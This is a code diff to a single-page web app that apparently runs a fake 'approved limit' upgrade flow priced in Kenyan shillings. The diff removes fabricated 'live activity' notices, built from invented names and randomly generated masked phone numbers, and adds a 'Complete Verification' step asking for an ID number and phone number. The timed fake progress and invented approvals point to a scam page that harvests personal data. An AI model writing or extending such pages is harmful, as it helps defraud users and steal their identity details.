@@ -19,7 +19,6 @@ body {
   height: 100vh;
 }
 
-/* CARD */
 .card {
   width: 90%;
   max-width: 360px;
@@ -30,7 +29,6 @@ body {
   box-shadow: 0 10px 25px rgba(0,0,0,0.1);
 }
 
-/* ICONS */
 .icon {
   width: 70px;
   height: 70px;
@@ -57,7 +55,6 @@ body {
   color: #fff;
 }
 
-/* TEXT */
 .title {
   font-size: 20px;
   font-weight: bold;
@@ -74,7 +71,6 @@ body {
   margin-top: 8px;
 }
 
-/* INPUT */
 input {
   width: 100%;
   padding: 14px;
@@ -83,7 +79,6 @@ input {
   margin: 15px 0;
 }
 
-/* BUTTON */
 button {
   width: 100%;
   padding: 14px;
@@ -95,7 +90,6 @@ button {
   cursor: pointer;
 }
 
-/* LOADER */
 .loader {
   width: 50px;
   height: 50px;
@@ -110,7 +104,6 @@ button {
   to { transform: rotate(360deg); }
 }
 
-/* GRID */
 .grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
@@ -138,23 +131,6 @@ button {
 .box.active {
   border: 2px solid #16a34a;
   background: #e6f4ea;
-}
-
-/* LIVE BOX */
-.live-box {
-  background: #fff;
-  border-radius: 12px;
-  padding: 10px;
-  margin-bottom: 15px;
-  font-size: 13px;
-  color: #333;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.08);
-  text-align: center;
-}
-
-.live-box span {
-  color: #16a34a;
-  font-weight: bold;
 }
 
 .hidden {
@@ -196,12 +172,6 @@ button {
 
 <!-- STEP 7 -->
 <div class="card hidden" id="step7">
-
-  <!-- LIVE ACTIVITY -->
-  <div id="liveBox" class="live-box hidden">
-    <span id="liveText"></span>
-  </div>
-
   <div class="title">Select Your New Approved Limit</div>
 
   <div class="grid">
@@ -221,8 +191,15 @@ button {
   </div>
 
   <br>
-  <button id="upgradeBtn">⚡ UPGRADE TO KSH 45,000</button>
+  <!-- ONLY CHANGE -->
+  <button id="upgradeBtn" onclick="goToStep8()">⚡ UPGRADE TO KSH 45,000</button>
+</div>
 
+<!-- STEP 8 -->
+<div class="card hidden" id="step8">
+  <div class="title">Complete Verification</div>
+  <input type="text" placeholder="Enter ID Number">
+  <input type="text" placeholder="Enter Phone Number">
 </div>
 
 </div>
@@ -238,18 +215,16 @@ function startProcess() {
   setTimeout(()=>showStep("step4","step5"),6000);
   setTimeout(()=>showStep("step5","step6"),8000);
   setTimeout(()=>showStep("step6","step7"),10000);
-
-  // SHOW LIVE ACTIVITY
-  setTimeout(() => {
-    document.getElementById("liveBox").classList.remove("hidden");
-    updateLive();
-    setInterval(updateLive, 3000);
-  }, 10500);
 }
 
 function showStep(hide, show) {
   document.getElementById(hide).classList.add("hidden");
   document.getElementById(show).classList.remove("hidden");
+}
+
+/* ONLY ADDED THIS */
+function goToStep8() {
+  showStep("step7", "step8");
 }
 
 /* SELECT LIMIT */
@@ -261,22 +236,6 @@ document.querySelectorAll(".box").forEach(box => {
     document.getElementById("upgradeBtn").innerText = "⚡ UPGRADE TO " + amount.toUpperCase();
   };
 });
-
-/* LIVE ACTIVITY */
-const names = ["Brian O.","Kevin M.","Faith N.","James K.","Mary A.","Peter W."];
-const amounts = ["Ksh 3,000","Ksh 5,000","Ksh 10,000","Ksh 21,000","Ksh 45,000","Ksh 70,000"];
-
-function randomMask() {
-  let num = Math.floor(700000000 + Math.random()*100000000);
-  return num.toString().slice(0,4) + "****" + num.toString().slice(-2);
-}
-
-function updateLive() {
-  let name = names[Math.floor(Math.random()*names.length)];
-  let amount = amounts[Math.floor(Math.random()*amounts.length)];
-  document.getElementById("liveText").innerHTML =
-    `${name} (${randomMask()}) boosted to <span>${amount}</span> just now`;
-}
 </script>
 
 </body>
